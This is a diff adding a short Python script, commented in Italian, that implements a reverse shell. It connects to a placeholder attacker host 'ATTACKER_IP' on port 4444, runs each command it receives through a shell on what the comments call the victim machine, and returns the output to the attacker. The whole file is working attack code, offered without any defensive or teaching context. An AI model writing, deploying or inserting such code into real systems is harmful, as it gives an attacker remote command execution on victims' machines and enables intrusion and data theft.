@@ -1,0 +1,31 @@
+import socket
+import subprocess
+
+# Parametri per la connessione al server (attaccante)
+LHOST = 'ATTACKER_IP'  # Cambia con l'IP del server (attaccante)
+LPORT = 4444  # Porta su cui il server è in ascolto
+
+def reverse_shell():
+    try:
+        # Connessione al server dell'attaccante
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client_socket.connect((LHOST, LPORT))
+
+        while True:
+            # Ricevi il comando dal server
+            command = client_socket.recv(1024).decode()
+            if command.lower() == 'exit':
+                break
+            
+            # Esegui il comando sulla macchina vittima
+            output = subprocess.run(command, shell=True, capture_output=True)
+
+            # Invia l'output al server
+            client_socket.send(output.stdout + output.stderr)
+
+        client_socket.close()
+    except Exception as e:
+        print(f"Errore: {e}")
+
+if __name__ == "__main__":
+    reverse_shell()
